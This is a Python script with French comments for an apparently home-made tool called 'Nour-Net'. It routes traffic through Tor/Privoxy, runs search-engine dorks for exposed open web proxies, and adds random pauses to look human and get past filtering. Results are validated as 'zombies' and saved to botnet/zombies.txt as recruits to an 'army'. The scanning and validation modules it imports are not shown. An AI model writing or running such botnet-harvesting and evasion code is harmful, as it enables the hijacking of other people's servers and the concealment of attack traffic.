import time
import random
import requests # Bibliothèque pour effectuer des requêtes HTTP (test de connexion)
import sys # Pour la gestion du système et l'arrêt propre du script
from core.scanner import NourScanner # Importation de ton moteur de recherche personnalisé
from core.validator import NourValidator # Importation de ton moteur de validation de cibles
from colorama import Fore, Style, init # Pour un affichage coloré et organisé dans le terminal

# Initialisation de colorama pour assurer la compatibilité des couleurs sur tous les systèmes
init(autoreset=True)

def check_connection():
    """Vérifie si Nour-Net est bien protégé par le tunnel Tor/Privoxy avant de démarrer"""
    proxy = "http://127.0.0.1:8118" # Adresse locale du tunnel de protection
    proxies = {"http": proxy, "https": proxy}
    print(f"{Fore.BLUE}[+] Vérification de la protection Tor...{Style.RESET_ALL}")
    
    try:
        # Requête de test vers le site officiel de vérification de Tor
        response = requests.get("https://check.torproject.org/", proxies=proxies, timeout=15)
        if "Congratulations" in response.text:
            print(f"{Fore.GREEN}[SUCCESS] Nour-Net est masqué derrière le réseau Tor.{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}[WARNING] Connexion établie mais l'IP réelle peut être exposée !{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Échec de la connexion au proxy (Privoxy est-il lancé ?) : {e}{Style.RESET_ALL}")
        return False

def start_nour_net():
    """Lance la séquence complète : Test -> Scan Multi-Dorks -> Validation"""
    # 1. On s'assure que la connexion est sécurisée
    if not check_connection():
        print(f"{Fore.RED}[!] Sécurité non garantie. Arrêt par précaution.{Style.RESET_ALL}")
        sys.exit()

    print(f"\n{Fore.MAGENTA}=== NOUR-NET : SESSION D'EXPLORATION ==={Style.RESET_ALL}")
    
    # 2. Initialisation des outils de chasse
    scanner = NourScanner()
    validator = NourValidator()
    
    # 3. Liste des Dorks stratégiques pour contourner le filtrage des moteurs
    dorks_list = [
        '"Simple PHP Proxy script"',
        '"powered by PHProxy"',
        '"open web proxy" "anonymous browsing"',
        '"nph-proxy" "CGI Proxy"',
    ]
    
    all_valid_zombies = []

    # 4. Boucle d'exploration automatique à travers la liste des dorks
    for dork in dorks_list:
        # Ajout d'une pause entre 5 et 10 secondes pour paraître humain
        pause = random.randint(5, 10)
        print(f"{Fore.BLUE}[INFO] Pause de sécurité : {pause}s...{Style.RESET_ALL}")
        time.sleep(pause)

        print(f"\n{Fore.YELLOW}[*] Analyse du dork : {dork}{Style.RESET_ALL}")
        targets = scanner.search_zombies(dork) # Appel de la méthode de scan
        
        if targets:
            print(f"{Fore.CYAN}[*] Analyse de {len(targets)} cibles potentielles...{Style.RESET_ALL}")
            for t in targets:
                # Si le validateur confirme que la cible est utilisable
                if validator.validate_zombie(t):
                    all_valid_zombies.append(t)
        else:
            print(f"{Fore.WHITE}[-] Aucun résultat pour ce dork précis.{Style.RESET_ALL}")

    # 5. Bilan de la mission et sauvegarde définitive dans l'armée
    if all_valid_zombies:
        print(f"\n{Fore.GREEN}=== BILAN FINAL DE LA CHASSE ==={Style.RESET_ALL}")
        validator.save_zombies(all_valid_zombies) # Enregistre dans botnet/zombies.txt
        print(f"{Fore.GREEN}[SUCCESS] {len(all_valid_zombies)} nouveaux soldats ont rejoint Nour-Net.{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}[!] Fin de session : Aucun zombie n'a pu être capturé.{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        start_nour_net() # Exécution du programme principal
    except KeyboardInterrupt:
        # Gestion propre de l'arrêt manuel (Ctrl+C)
        print(f"\n{Fore.YELLOW}[!] Interruption demandée. Que la Paix soit sur toi, Nour.{Style.RESET_ALL}")